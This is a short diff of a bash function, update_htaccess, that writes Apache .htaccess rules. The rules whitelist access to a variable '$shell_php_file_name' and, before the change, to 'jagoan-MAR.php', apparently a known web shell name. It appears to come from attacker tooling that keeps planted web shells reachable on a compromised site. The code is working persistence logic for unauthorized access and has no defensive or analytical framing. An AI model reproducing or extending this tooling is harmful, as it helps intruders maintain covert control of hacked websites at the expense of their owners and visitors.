@@ -77,12 +77,12 @@ update_htaccess() {
     echo "    Allow from all"
     echo "</FilesMatch>"
     echo
-    echo "<FilesMatch \"^(index.html|index.php|$php_file_name|$shell_php_file_name|jagoan-MAR.php|class.php|class-index.php|config.php)\$\">"
+    echo "<FilesMatch \"^(index.html|index.php|$php_file_name|$shell_php_file_name|class.php|class-index.php|config.php)\$\">"
     echo " Order allow,deny"
     echo " Allow from all"
     echo "</FilesMatch>"
     echo
-    echo "DirectoryIndex index.php"
+    echo "DirectoryIndex index.php index.html"
     echo
     echo "Options -Indexes"
   } > "$htaccess_file" || {
